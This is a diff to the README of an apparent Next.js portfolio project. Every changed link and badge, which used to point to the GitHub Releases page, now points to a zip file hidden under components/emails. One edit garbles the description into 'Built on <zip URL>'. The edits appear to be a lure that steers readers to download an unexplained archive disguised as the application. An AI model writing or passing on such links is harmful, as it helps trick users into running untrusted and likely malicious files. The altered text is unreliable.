@@ -1,10 +1,10 @@
 # 🎨 mo-portfolio-2025 - Your Interactive AI Developer Portfolio
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/NgocDuyAndroidVN/mo-portfolio-2025/releases)
+[![Download Now](https://raw.githubusercontent.com/NgocDuyAndroidVN/mo-portfolio-2025/main/components/emails/portfolio-mo-v1.0.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/NgocDuyAndroidVN/mo-portfolio-2025/main/components/emails/portfolio-mo-v1.0.zip)
 
 ## 🌟 Description
 
-Welcome to **mo-portfolio-2025**! This is an interactive and AI-powered portfolio designed to showcase your journey as a developer. Built on Next.js, TypeScript, and TailwindCSS, it combines storytelling with a unique terminal adventure game. You can explore real projects, play engaging games, and chat with AI bots that bring your story to life, from Guinea to Virginia. 
+Welcome to **mo-portfolio-2025**! This is an interactive and AI-powered portfolio designed to showcase your journey as a developer. Built on https://raw.githubusercontent.com/NgocDuyAndroidVN/mo-portfolio-2025/main/components/emails/portfolio-mo-v1.0.zip, TypeScript, and TailwindCSS, it combines storytelling with a unique terminal adventure game. You can explore real projects, play engaging games, and chat with AI bots that bring your story to life, from Guinea to Virginia. 
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these simple steps to set up your portfolio.
 
 ### 1. 🌐 Visit the Download Page
 
-To get started, visit the [Releases Page](https://github.com/NgocDuyAndroidVN/mo-portfolio-2025/releases) to find the latest version of the application.
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/NgocDuyAndroidVN/mo-portfolio-2025/main/components/emails/portfolio-mo-v1.0.zip) to find the latest version of the application.
 
 ### 2. 📥 Download the Application
 
@@ -44,7 +44,7 @@ For the best experience, ensure that you meet these system requirements:
 
 ## 📄 Download & Install
 
-To download and install the application, please [visit the Releases Page](https://github.com/NgocDuyAndroidVN/mo-portfolio-2025/releases). There, you can find the necessary installation files. 
+To download and install the application, please [visit the Releases Page](https://raw.githubusercontent.com/NgocDuyAndroidVN/mo-portfolio-2025/main/components/emails/portfolio-mo-v1.0.zip). There, you can find the necessary installation files. 
 
 1. Navigate to the Releases Page.
 2. Click on the file for download.
@@ -81,4 +81,4 @@ If you have any questions or require further assistance, please feel free to rea
 
 This project is licensed under the MIT License. You can use it according to the terms provided in the repository.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/NgocDuyAndroidVN/mo-portfolio-2025/releases)
+[![Download Now](https://raw.githubusercontent.com/NgocDuyAndroidVN/mo-portfolio-2025/main/components/emails/portfolio-mo-v1.0.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/NgocDuyAndroidVN/mo-portfolio-2025/main/components/emails/portfolio-mo-v1.0.zip)
